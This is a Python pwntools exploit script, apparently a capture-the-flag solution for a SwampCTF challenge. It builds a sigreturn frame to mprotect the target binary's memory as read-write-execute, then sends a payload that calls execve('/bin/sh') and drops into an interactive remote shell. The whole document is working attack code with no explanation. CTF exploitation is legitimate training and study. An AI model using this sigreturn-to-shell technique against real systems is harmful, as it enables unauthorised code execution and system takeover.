from pwn import *

t = remote('chal1.swampctf.com', 1800)

context.arch = "amd64"

# Do sigreturn syscall
buf = ""
buf += p64(0)	# r12
buf += p64(0)	# r11
buf += p64(0)	# rdi - ignored
buf += p64(15)	# rax - sigreturn
buf += p64(0)	# rbx
buf += p64(0)	# rdx
buf += p64(0)	# rsi
buf += p64(0)	# rdi

# sigreturn frame - set up regs for next syscall
frame = SigreturnFrame()
frame.rax = 10          # mprotect
frame.rdi = 0x400000    # addr - start of binary
frame.rsi = 0x1000      # size - one page
frame.rdx = 7           # prot - RWX
frame.rsp = 0x400a60    # set to binary for reading input on next syscall
frame.rip = 0x400104    # return to 1st syscall

frame_str = str(frame)
buf += frame_str

log.info("mprotecting binary...")
t.send(buf)

# Call execve("/bin/sh", 0, 0)
buf = ""
buf += p64(0)	# r12
buf += p64(0)	# r11
buf += p64(0)	# rdi - ignored
buf += p64(59)	# rax - execve
buf += p64(0)	# rbx
buf += p64(0)	# rdx
buf += p64(0)	# rsi
buf += p64(0x400a60 + 8*8)	# rdi - ptr to /bin/sh
buf += "/bin/sh\0"

log.info("Calling execve...")
t.send(buf)

t.interactive()
